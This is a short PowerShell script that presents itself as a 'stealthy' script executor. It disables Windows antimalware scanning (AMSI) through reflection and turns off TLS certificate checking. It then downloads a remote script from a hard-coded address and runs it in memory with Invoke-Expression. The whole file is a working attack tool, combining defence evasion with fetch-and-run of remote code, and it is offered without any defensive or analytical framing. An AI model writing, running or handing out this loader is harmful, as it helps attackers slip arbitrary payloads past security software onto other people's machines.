<#
.SYNOPSIS
Stealthy PowerShell Script Executor with AMSI Bypass and In-Memory Execution
#>

# 1. AMSI Bypass
# This prevents AV from inspecting the PowerShell string content
$asm = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$asm.GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)

# 2. Define URL (Replace this)
$scriptUrl = "http://10.211.55.5:8000/try.ps1"

# 3. Download in memory
try {
    # Using WebClient to download content directly to a variable
    $webClient = New-Object Net.WebClient
    Add-Type -TypeDefinition "using System.Net; using System.Security.Cryptography.X509Certificates; public class TrustAllCerts : ICertificatePolicy { public bool CheckValidationResult(ServicePoint srvPoint, X509Certificate cert, WebRequest request, int certificateProblem) { return true; } }"
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
    [System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCerts
    $scriptContent = $webClient.DownloadString($scriptUrl)
} catch {
    Write-Host "Error downloading: $_"
    exit
}

# 4. Execute in Memory
# Output suppression to reduce noise
$null = Invoke-Expression $scriptContent
